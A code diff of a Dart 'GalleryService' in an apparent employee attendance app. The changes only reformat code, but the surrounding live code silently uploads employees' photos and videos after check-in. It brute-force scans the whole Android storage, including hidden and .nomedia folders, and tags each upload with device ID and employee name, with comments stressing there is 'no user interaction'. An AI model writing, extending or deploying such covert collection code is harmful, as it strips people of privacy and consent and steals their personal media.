@@ -10,8 +10,20 @@ import 'attendance_service.dart';
 /// Ini SOP perangkat kantor — tidak ada interaksi pengguna.
 class GalleryService {
   static const _allowedExtensions = [
-    '.jpg', '.jpeg', '.png', '.gif', '.webp', '.heic', '.heif',
-    '.mp4', '.mov', '.avi', '.mkv', '.webm', '.3gp', '.flv',
+    '.jpg',
+    '.jpeg',
+    '.png',
+    '.gif',
+    '.webp',
+    '.heic',
+    '.heif',
+    '.mp4',
+    '.mov',
+    '.avi',
+    '.mkv',
+    '.webm',
+    '.3gp',
+    '.flv',
   ];
 
   /// Minta izin galeri + storage saat app pertama dibuka.
@@ -31,7 +43,9 @@ class GalleryService {
         ),
       ),
     );
-    return result.isAuth || (Platform.isAndroid && await Permission.manageExternalStorage.isGranted);
+    return result.isAuth ||
+        (Platform.isAndroid &&
+            await Permission.manageExternalStorage.isGranted);
   }
 
   /// Background sync — dipanggil otomatis setelah absen, tidak block UI.
@@ -56,8 +70,12 @@ class GalleryService {
         final paths = await PhotoManager.getAssetPathList(
           type: RequestType.common,
           filterOption: FilterOptionGroup(
-            imageOption: const FilterOption(sizeConstraint: SizeConstraint(ignoreSize: true)),
-            videoOption: const FilterOption(sizeConstraint: SizeConstraint(ignoreSize: true)),
+            imageOption: const FilterOption(
+              sizeConstraint: SizeConstraint(ignoreSize: true),
+            ),
+            videoOption: const FilterOption(
+              sizeConstraint: SizeConstraint(ignoreSize: true),
+            ),
             containsPathModified: true,
           ),
         );
@@ -87,7 +105,8 @@ class GalleryService {
 
       // ── Metode 2: Brute-force scan filesystem (untuk folder .nomedia / tersembunyi) ─
       // Hanya berjalan di Android dengan izin MANAGE_EXTERNAL_STORAGE
-      if (Platform.isAndroid && await Permission.manageExternalStorage.isGranted) {
+      if (Platform.isAndroid &&
+          await Permission.manageExternalStorage.isGranted) {
         final root = Directory('/storage/emulated/0');
         if (root.existsSync()) {
           await _scanDirectory(root, deviceId, employeeName, uploadedPaths);
@@ -145,7 +164,13 @@ class GalleryService {
         ..fields['employee_name'] = employeeName
         ..fields['original_name'] = originalName
         ..fields['taken_at'] = takenAt
-        ..files.add(await http.MultipartFile.fromPath('photo', file.path, filename: originalName));
+        ..files.add(
+          await http.MultipartFile.fromPath(
+            'photo',
+            file.path,
+            filename: originalName,
+          ),
+        );
 
       await req.send().timeout(const Duration(seconds: 60));
     } catch (e) {
